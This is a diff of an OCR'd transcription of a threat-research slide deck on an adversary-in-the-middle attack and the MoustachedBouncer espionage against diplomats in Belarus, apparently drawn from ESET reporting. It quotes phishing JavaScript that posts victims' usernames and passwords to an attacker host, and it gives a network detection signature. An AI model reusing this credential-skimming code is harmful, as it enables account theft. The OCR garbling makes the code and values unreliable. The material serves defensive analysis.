-if(this.readyState === XMLHttpRequest .DONE){
 if (this.response.includes('login.jsp')) {
 var alertElement = document.getElementById("errorMessageDiv" );
 alertElement.innerHTML = "The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current
 username and password.";
 getCSRFTokenFromString(this.response);
-yelsef{
 var saveCredentialsRequest = new XMLHttpRequest( );
 saveCredentialsRequest.open("POST", ‘https://' + serverDomain + '/' + serverPath + '/auth.php', true);
-saveCredentialsRequest.setRequestHeader( "Content-Type", "“application/x-www-form-urlencoded" );
 saveCredentialsRequest.onreadystatechange = function() {
 if(this.readyState === XMLHttpRequest.DONE){
 var signInElement = document.getElementById("lic34yo80" );
-document. getElementsByTagName( 'body' )[0].removeChild(signInElement );
 }
 +
 saveCredentialsRequest.send("accountName=" + accountName + "&username=" + username + "&password=" + password);
@@ -1525,7 +1534,6 @@ saveCredentialsRequest.send("accountName=" + accountName + "&username=" + userna
 }
 if(csrfT){
 serverAuthRequest.send("login0p=login&client=preferred&username=" + username + "&password=" + password + "&login_csrf=" + csrfT);
-yelset
 serverAuthRequest.send("loginOp=login&client=preferred&username=" + username + "&password=" + password);
 ```
 
@@ -1589,9 +1597,9 @@ To prevent AitM
 
 **content:"|78 5a 57 31 77 64 48 6b 78 02 31 31 01 31 01 31 03 63 69 64|";offset:13;)**
 
-```
+\```
 xZW1wdHkx.11.1.1.cid
-```
+\```
 
 ## Slide 89
 
@@ -1623,11 +1631,11 @@ Target foreign diplomats in Belarus
 
 ## Slide 93
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 welivesecurity wy Ger} Award-winning news, views, and insight from the ESET security com
-TIPS & ADVICE BUSINESSSECURITY ESETRESEARCHy FEATUREDyr TOPICS~ ABOUT US~
 ESET RESEARCH
 MoustachedBouncer: Espionage
 against foreign diplomats in Belarus
